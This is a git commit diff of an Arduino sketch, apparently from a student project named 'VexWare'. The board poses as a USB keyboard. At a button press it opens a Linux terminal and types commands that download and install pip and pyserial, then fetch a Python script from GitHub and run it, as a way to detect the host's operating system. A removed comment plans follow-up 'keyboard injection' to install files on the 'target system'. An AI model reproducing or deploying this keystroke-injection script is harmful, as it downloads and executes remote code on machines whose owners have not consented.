075e3f7fdfce3f4f27ba395a8b910bc8252c7c6c
Andrew Phillips <adp1030@gmail.com>
2024-05-01 23:20:27 -0400

    adding working os recognition script

--- src/os_recognition/os_recognition_test_linux/os_recognition_test_linux.ino
+++ src/os_recognition/os_recognition_test_linux/os_recognition_test_linux.ino
@@ -1,10 +1,14 @@
+
+#include <Keyboard.h>
+
 int hasRun = 0;
-int td = 500; // delay after each keystroke
+unsigned long td = 3000; // delay after each keystroke
+long baudRate = 9600;
 
 void setup() {
-  long baudRate = 9600;
-  pinMode(21, OUTPUT);
   pinMode(2, INPUT_PULLUP);
+  pinMode(21, OUTPUT);
+  digitalWrite(21,HIGH); // turn off LED 
   Keyboard.begin();
 }
 
@@ -17,7 +21,7 @@ void loop() {
     if (hasRun == 0) {
       // Begin keystroke sequence
       // Try opening Linux terminal with several popular shortcuts.
-      Keyboard.press(KEY_LEFT_SHIFT);
+      Keyboard.press(KEY_LEFT_CTRL);
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press('t');
       Keyboard.releaseAll();
@@ -29,36 +33,37 @@ void loop() {
       delay(td); // let animation play  
 
       // Install pip on local user, without sudo permissions
-      Keyboard.print('wget https://bootstrap.pypa.io/get-pip.py');
+      Keyboard.print("wget https://bootstrap.pypa.io/get-pip.py");
       Keyboard.press(KEY_RETURN);
       Keyboard.releaseAll();
-      delay(td); // let animation play 
+      delay(5000); // let animation play 
 
-      Keyboard.print('python get-pip.py --user')
+      Keyboard.print("python3 get-pip.py --user");
       Keyboard.press(KEY_RETURN);
       Keyboard.releaseAll();
-      delay(td); // let animation play 
+      delay(5000); // let animation play 
 
       // Pip install pyserial
-      Keyboard.print('pip install pyserial')
+      Keyboard.print("pip install pyserial");
       Keyboard.press(KEY_RETURN);
       Keyboard.releaseAll();
       delay(5000); // let pyserial install
 
       // Download python script from repo
-      Keyboard.print('wget https://raw.githubusercontent.com/olincollege/VexWare/master/src/os_recognition/test_serial_linux.py');
+      Keyboard.print("wget https://raw.githubusercontent.com/olincollege/VexWare/master/src/os_recognition/test_serial_linux.py");
       Keyboard.press(KEY_RETURN);
       Keyboard.releaseAll();
-      delay(1000); // get file
+      delay(3000); // get file
 
       // Run python script
-      Keyboard.print('python3 test_serial_linux.py');
+      Keyboard.print("python3 test_serial_linux.py");
       Keyboard.press(KEY_RETURN);
       Keyboard.releaseAll();
       delay(td); // get file
 
       // End keyboard emulation and begin reading serial port
       Keyboard.end();
+      delay(td);
 
       Serial.begin(baudRate);
 
@@ -72,20 +77,7 @@ void loop() {
       digitalWrite(21,HIGH); // turn off LED 
       delay(1000);
       }
+      
+    }
+  }
 }
-
-/*
-Potential way to recognize operating system:
-
-- install pip on ubuntu on the local user, without sudo permissions
-- use pip to install pyserial
-- download python script to send signals over serial to USB ports
-- Run python script
-- Stop keyboard emulation on Arduino and begin serial reads
-- If serial signal is read, can identify the operating system as Linux.
-
-- somehow signal to the target system that Linux was recognized
-- OR:
-- Restart keyboard emulation
-- Run the appropriate keyboard injection sequence to install files
-*/
